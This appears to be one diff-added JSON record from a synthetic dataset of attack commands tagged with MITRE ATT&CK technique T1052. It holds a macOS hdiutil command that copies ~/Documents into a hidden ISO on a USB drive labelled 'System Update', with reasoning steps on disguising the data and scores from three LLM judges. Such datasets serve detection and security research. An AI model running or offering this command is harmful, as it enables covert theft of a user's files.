@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "hdiutil makehybrid -o /Volumes/USB/.update.iso ~/Documents -udf -udf-volume-name \"System Update\"",
+  "explanation": "Creates a UDF hybrid image from local documents directly onto the USB with a benign volume label to disguise staged data.",
+  "rationale_steps": [
+    "Package files into a single image for easy removable transfer.",
+    "Use a system-like label to blend with legitimate content.",
+    "Write output straight to the external drive.",
+    "No network dependency; exfiltration relies on physical removal."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-19e64b98-447c6eac",
+  "source_prompt_hash": "19e64b98",
+  "timestamp_utc": "2025-09-30T05:31:52.812086Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting and valid hdiutil makehybrid flags (-o, -udf, -udf-volume-name) and plausible paths.",
+        "semantic_score": 5,
+        "semantic_justification": "It creates a UDF disk image of ~/Documents with an innocuous volume label directly on the mounted USB volume, aligning with staging and disguising data for exfiltration over a physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:26:09.452670Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quotes, valid flags, and correct parameter structure for the hdiutil makehybrid command on macOS.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by creating a disguised ISO image directly on a USB drive containing user documents with an innocuous name ('System Update') that facilitates physical exfiltration while evading detection.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:26:13.258246Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid `hdiutil makehybrid` syntax with correctly formed flags, input/output paths, and balanced quotes, making it perfectly well-formed.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the claimed intent, using the appropriate macOS tool and flags to package documents into a disguised disk image directly on a USB drive, effectively implementing T1052's staging and obfuscation tactics.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:26:23.788525Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
